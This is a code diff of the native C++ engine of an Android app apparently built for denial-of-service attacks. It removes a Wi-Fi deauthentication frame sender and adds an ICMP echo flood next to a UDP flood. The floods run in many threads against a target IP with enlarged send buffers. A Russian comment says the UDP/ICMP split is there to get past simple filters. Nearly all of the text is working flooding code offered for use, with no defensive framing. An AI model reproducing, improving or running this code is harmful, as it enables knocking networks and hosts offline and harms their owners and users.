@@ -1,8 +1,9 @@
 #include <jni.h>
-#include <android/log.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
 #include <net/if.h>
 #include <linux/if_packet.h>
 #include <netinet/if_ether.h>
@@ -15,36 +16,17 @@
 std::atomic<bool> isAttacking{false};
 std::atomic<uint64_t> packetCount{0};
 
-void sendDeauth(int sock, const char* iface, const uint8_t* targetMac, const uint8_t* apMac) {
-    uint8_t frame[26];
-    frame[0] = 0xC0; frame[1] = 0x00;
-    frame[2] = 0x00; frame[3] = 0x00;
-    memcpy(frame + 4, targetMac, 6);
-    memcpy(frame + 10, apMac, 6);
-    memcpy(frame + 16, apMac, 6);
-    frame[22] = 0x00; frame[23] = 0x00;
-    frame[24] = 0x07; frame[25] = 0x00;
-
-    struct sockaddr_ll addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sll_family = AF_PACKET;
-    addr.sll_protocol = htons(ETH_P_ALL);
-    addr.sll_ifindex = if_nametoindex(iface);
-    addr.sll_halen = ETH_ALEN;
-    memcpy(addr.sll_addr, targetMac, 6);
-
-    while (isAttacking) {
-        if (sendto(sock, frame, sizeof(frame), 0, (struct sockaddr*)&addr, sizeof(addr)) > 0) packetCount++;
-    }
-}
-
 void udpFlood(const char* targetIp, int port) {
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return;
+    
     int optval = 1;
     setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &optval, sizeof(optval));
-    int sndbuf = 4194304;
+    int sndbuf = 8388608; // 8MB буфер
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    
+    int tos = IPTOS_THROUGHPUT | IPTOS_LOWDELAY;
+    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
 
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
@@ -52,39 +34,72 @@ void udpFlood(const char* targetIp, int port) {
     inet_pton(AF_INET, targetIp, &dest.sin_addr);
 
     char payload[1400];
-    memset(payload, 'V', sizeof(payload));
+    memset(payload, 'T', sizeof(payload));
 
     while (isAttacking) {
-        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) packetCount++;
+        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
+            packetCount++;
+        }
+    }
+    close(sock);
+}
+
+void icmpFlood(const char* targetIp) {
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) return;
+    
+    int sndbuf = 8388608;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    inet_pton(AF_INET, targetIp, &dest.sin_addr);
+
+    char packet[sizeof(struct icmphdr) + 1400];
+    memset(packet, 0, sizeof(packet));
+    struct icmphdr *icmp = (struct icmphdr *)packet;
+    icmp->type = ICMP_ECHO;
+    icmp->code = 0;
+    icmp->checksum = 0;
+    icmp->un.echo.id = htons(1337);
+    icmp->un.echo.sequence = htons(1);
+
+    while (isAttacking) {
+        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
+            packetCount++;
+        }
     }
     close(sock);
 }
 
 extern "C" JNIEXPORT void JNICALL
-Java_com_vanta_wifidos_NativeEngine_startAttack(JNIEnv* env, jobject, jstring targetIp, jint threads, jboolean useDeauth, jstring iface, jbyteArray targetMac, jbyteArray apMac) {
+Java_com_twks_wifi_NativeEngine_startAttack(JNIEnv* env, jobject, jstring targetIp, jint threads) {
     isAttacking = true;
     packetCount = 0;
     const char* ip = env->GetStringUTFChars(targetIp, 0);
     std::vector<std::thread> workers;
 
-    for (int i = 0; i < threads; i++) workers.emplace_back(udpFlood, ip, 80 + (i % 100));
+    // 70% UDP, 30% ICMP для обхода простых фильтров
+    int udpThreads = (threads * 7) / 10;
+    int icmpThreads = threads - udpThreads;
 
-    if (useDeauth && targetMac && apMac && iface) {
-        const char* ifName = env->GetStringUTFChars(iface, 0);
-        jbyte* tMac = env->GetByteArrayElements(targetMac, 0);
-        jbyte* aMac = env->GetByteArrayElements(apMac, 0);
-        int rawSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-        if (rawSock >= 0) workers.emplace_back(sendDeauth, rawSock, ifName, (uint8_t*)tMac, (uint8_t*)aMac);
-        env->ReleaseStringUTFChars(iface, ifName);
-        env->ReleaseByteArrayElements(targetMac, tMac, 0);
-        env->ReleaseByteArrayElements(apMac, aMac, 0);
+    for (int i = 0; i < udpThreads; i++) {
+        workers.emplace_back(udpFlood, ip, 80 + (i % 100));
     }
+    for (int i = 0; i < icmpThreads; i++) {
+        workers.emplace_back(icmpFlood, ip);
+    }
+
     for (auto& t : workers) t.join();
     env->ReleaseStringUTFChars(targetIp, ip);
 }
 
 extern "C" JNIEXPORT void JNICALL
-Java_com_vanta_wifidos_NativeEngine_stopAttack(JNIEnv*, jobject) { isAttacking = false; }
+Java_com_twks_wifi_NativeEngine_stopAttack(JNIEnv*, jobject) { 
+    isAttacking = false; 
+}
 
 extern "C" JNIEXPORT jlong JNICALL
-Java_com_vanta_wifidos_NativeEngine_getPacketCount(JNIEnv*, jobject) { return packetCount.load(); }
+Java_com_twks_wifi_NativeEngine_getPacketCount(JNIEnv*, jobject) { 
+    return packetCount.load(); 
+}
